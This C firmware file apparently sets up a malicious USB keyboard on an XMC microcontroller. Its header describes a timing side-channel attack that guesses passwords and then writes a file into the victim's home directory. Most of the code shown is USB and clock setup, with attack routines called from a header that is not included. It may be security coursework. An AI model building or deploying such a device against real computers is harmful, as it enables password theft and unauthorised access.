/*******************************************************************************
 * HID KEYBOARD TIMING ATTACK IMPLEMENTATION
 *
 * This program implements a USB HID keyboard that performs a timing side-channel
 * attack to crack passwords character-by-character, then creates a file in the
 * victim's home directory.
 ******************************************************************************/

#include "KeyboardHID.h"
#include "german_keyboardCodes.h"
#include "password_attack.h"

// LED pins for visual feedback (NUMLOCK/CAPSLOCK indicators)
#define LED1 P1_1
#define LED2 P1_0

// Clock configuration for USB operation
XMC_SCU_CLOCK_CONFIG_t clock_config = {
	.syspll_config.p_div  = 2,
	.syspll_config.n_div  = 80,
	.syspll_config.k_div  = 4,
	.syspll_config.mode   = XMC_SCU_CLOCK_SYSPLL_MODE_NORMAL,
	.syspll_config.clksrc = XMC_SCU_CLOCK_SYSPLLCLKSRC_OSCHP,
	.enable_oschp         = true,
	.calibration_mode     = XMC_SCU_CLOCK_FOFI_CALIBRATION_MODE_FACTORY,
	.fsys_clksrc          = XMC_SCU_CLOCK_SYSCLKSRC_PLL,
	.fsys_clkdiv          = 1,
	.fcpu_clkdiv          = 1,
	.fccu_clkdiv          = 1,
	.fperipheral_clkdiv   = 1
};

// USB HID callbacks required by LUFA library
bool CALLBACK_HID_Device_CreateHIDReport(USB_ClassInfo_HID_Device_t* const HIDInterfaceInfo, uint8_t* const ReportID, const uint8_t ReportType, void* ReportData, uint16_t* const ReportSize);
void CALLBACK_HID_Device_ProcessHIDReport(USB_ClassInfo_HID_Device_t* const HIDInterfaceInfo, const uint8_t ReportID, const uint8_t ReportType, const void* ReportData, const uint16_t ReportSize);

// System initialization
void SystemCoreClockSetup(void);

int main(void)
{
	// Initialize LED pins for visual feedback (shows NUMLOCK/CAPSLOCK state)
	XMC_GPIO_SetMode(LED1, XMC_GPIO_MODE_OUTPUT_PUSH_PULL);
	XMC_GPIO_SetMode(LED2, XMC_GPIO_MODE_OUTPUT_PUSH_PULL);

	// Initialize USB subsystem
	USB_Init();

	// Initialize SysTick timer for timing measurements (1ms tick)
	SysTick_Config(SystemCoreClock / 1000);

	// Initialize password attack state machine
	AttackInit();

	// Wait for USB host enumeration to complete
	for(int i = 0; i < 10e6; ++i)
		;

	// Main loop: continuously process USB tasks
	while (1) {
		HID_Device_USBTask(&Keyboard_HID_Interface);
	}
}

// Callback: Create HID Report (OUTPUT)
// Called by USB stack when host requests keyboard input
bool CALLBACK_HID_Device_CreateHIDReport(USB_ClassInfo_HID_Device_t* const HIDInterfaceInfo, uint8_t* const ReportID, const uint8_t ReportType, void* ReportData, uint16_t* const ReportSize )
{
	USB_KeyboardReport_Data_t* report = (USB_KeyboardReport_Data_t *)ReportData;
	*ReportSize = sizeof(USB_KeyboardReport_Data_t);

	AttackCreateReport(report);

	return true;
}

// Callback: Process HID Report (INPUT)
// Called by USB stack when host sends LED status updates
void CALLBACK_HID_Device_ProcessHIDReport(USB_ClassInfo_HID_Device_t* const HIDInterfaceInfo, const uint8_t ReportID, const uint8_t ReportType, const void* ReportData, const uint16_t ReportSize)
{
	uint8_t *report = (uint8_t*)ReportData;

	// Update physical LEDs to mirror host LED state
	if(*report & HID_KEYBOARD_LED_NUMLOCK)
	{
		XMC_GPIO_SetOutputHigh(LED1);
	}
	else
	{
		XMC_GPIO_SetOutputLow(LED1);
	}
	AttackProcessResponse(report);

	if(*report & HID_KEYBOARD_LED_CAPSLOCK)
	{
		XMC_GPIO_SetOutputHigh(LED2);
		MarkAttackCompleted();
	}
	else
	{
		XMC_GPIO_SetOutputLow(LED2);
	}
}

// Configure system clocks for USB operation
// Called automatically before main() by startup code
void SystemCoreClockSetup(void)
{
	// Initialize system clock with configuration from clock_config struct
	XMC_SCU_CLOCK_Init(&clock_config);

	// Configure USB PLL and clock tree
	XMC_SCU_CLOCK_EnableUsbPll();
	XMC_SCU_CLOCK_StartUsbPll(2, 64);
	XMC_SCU_CLOCK_SetUsbClockDivider(4);
	XMC_SCU_CLOCK_SetUsbClockSource(XMC_SCU_CLOCK_USBCLKSRC_USBPLL);
	XMC_SCU_CLOCK_EnableClock(XMC_SCU_CLOCK_USB);

	// Update SystemCoreClock variable
	SystemCoreClockUpdate();
}
